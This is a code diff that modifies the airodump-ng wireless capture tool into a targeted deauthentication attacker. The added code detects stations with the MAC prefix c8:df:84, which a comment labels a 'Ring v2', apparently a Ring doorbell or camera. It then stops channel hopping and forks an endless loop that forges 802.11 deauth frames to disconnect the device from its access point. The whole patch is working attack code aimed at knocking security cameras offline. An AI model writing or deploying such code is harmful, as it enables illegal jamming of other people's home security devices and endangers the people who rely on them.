@@ -96,6 +96,7 @@ uint8_t h80211[4096] __attribute__((aligned(16)));
 uint8_t tmpbuf[4096] __attribute__((aligned(16)));
 
 static const unsigned char llcnull[] = {0, 0, 0, 0};
+static pid_t hopper, deauther;
 
 static const char * OUI_PATHS[]
 	= {"./airodump-ng-oui.txt",
@@ -139,6 +140,7 @@ static void dump_print(int ws_row, int ws_col, int if_num);
 static char *
 get_manufacturer(unsigned char mac0, unsigned char mac1, unsigned char mac2);
 int is_filtered_essid(const uint8_t * essid);
+unsigned long nb_pkt_sent;
 
 /* bunch of global stuff */
 struct communication_options opt;
@@ -1212,11 +1214,22 @@ static int remove_namac(unsigned char * mac)
 	return (0);
 }
 
+unsigned char ring_ap[6];
+unsigned char ring_sta[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+static int do_attack_deauth(struct wif *interface, uint8_t *ap_address, uint8_t *target_address);
+
+static void deauth_loop(struct wif *interface, int channel) {
+	wi_set_channel(interface, channel);
+	lopt.channel[0] = channel;
+	while (1) {
+		do_attack_deauth(interface, ring_ap, ring_sta);
+	}
+}
+
 // NOTE(jbenden): This is also in ivstools.c
-static int dump_add_packet(unsigned char * h80211,
-						   int caplen,
-						   struct rx_info * ri,
-						   int cardnum)
+static int dump_add_packet(struct wif *interface, unsigned char * h80211,
+			   int caplen, struct rx_info * ri, int cardnum)
 {
 	REQUIRE(h80211 != NULL);
 
@@ -1237,6 +1250,7 @@ static int dump_add_packet(unsigned char * h80211,
 	unsigned char clear[2048];
 	int weight[16];
 	int num_xor = 0;
+	char ring_addr[3] = {0xc8, 0xdf, 0x84};
 
 	struct AP_info * ap_cur = NULL;
 	struct ST_info * st_cur = NULL;
@@ -1537,6 +1551,24 @@ static int dump_add_packet(unsigned char * h80211,
 
 	st_cur = lopt.st_1st;
 	st_prv = NULL;
+
+	if (!memcmp(ap_cur->bssid, BROADCAST, 6))
+		goto skip_station;
+
+	if (!memcmp(stmac, ring_addr, 3) && hopper != 0) {
+		/* Found a Ring v2 - stop channel hopping */
+		kill(hopper, SIGKILL);
+		hopper = 0;
+		memcpy(ring_ap, bssid, 6);
+		memcpy(ring_sta, stmac, 6);
+		deauther = fork();
+		if (deauther == 0) {
+			deauth_loop(interface, ap_cur->channel);
+		}
+	} else {
+		/* We don't care about any other station types */
+		goto skip_station;
+	}
 
 	while (st_cur != NULL)
 	{
@@ -3657,6 +3689,9 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 
 		while (ap_cur != NULL)
 		{
+			/* Don't display APs, we don't care */
+			break;
+
 			/* skip APs with only one packet, or those older than 2 min.
 		* always skip if bssid == broadcast */
 			if (IsAp2BeSkipped(ap_cur))
@@ -4880,6 +4915,7 @@ static void sighandler(int signum)
 		show_cursor();
 		reset_term();
 		fprintf(stdout, "Quitting...\n");
+		kill(deauther, SIGKILL);
 	}
 
 	if (signum == SIGSEGV)
@@ -5606,6 +5642,39 @@ static int check_monitor(struct wif * wi[], int * fd_raw, int * fdh, int cards)
 		}
 	}
 	return (0);
+}
+
+#define DEAUTH_REQ                                                             \
+        "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
+        "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
+
+static int do_attack_deauth(struct wif *interface, uint8_t *ap_address, uint8_t *target_address)
+{
+	extern uint8_t h80211[4096];
+
+	/* deauthenticate the target */
+
+	memcpy(h80211, DEAUTH_REQ, 26);
+	memcpy(h80211 + 16, ap_address, 6);
+
+	/* add the deauth reason code */
+	h80211[24] = 7;
+
+	memcpy(h80211 + 4, target_address, 6);
+	memcpy(h80211 + 10, ap_address, 6);
+
+	if (send_packet(interface, h80211, 26, kRewriteDuration) < 0)
+		return (EXIT_FAILURE);
+
+	usleep(2000);
+
+	memcpy(h80211 + 4, ap_address, 6);
+	memcpy(h80211 + 10, target_address, 6);
+
+	if (send_packet(interface, h80211, 26, kRewriteDuration) < 0)
+		return (EXIT_FAILURE);
+
+        return (EXIT_SUCCESS);
 }
 
 static int check_channel(struct wif * wi[], int cards)
@@ -6704,7 +6773,8 @@ int main(int argc, char * argv[])
 				if (sigaction(SIGUSR1, &action, NULL) == -1)
 					perror("sigaction(SIGUSR1)");
 
-				if (!fork())
+				hopper = fork();
+				if (hopper == 0)
 				{
 					/* reopen cards.  This way parent & child don't share
 					* resources for
@@ -7296,13 +7366,13 @@ int main(int argc, char * argv[])
 					read_pkts++;
 
 					wi_read_failed = 0;
-					dump_add_packet(h80211, caplen, &ri, i);
+					dump_add_packet(wi[i], h80211, caplen, &ri, i);
 				}
 			}
 		}
 		else if (opt.s_file != NULL)
 		{
-			dump_add_packet(h80211, caplen, &ri, i);
+			dump_add_packet(NULL, h80211, caplen, &ri, i);
 		}
 
 		if (quitting && time(NULL) - quitting_event_ts > 3)
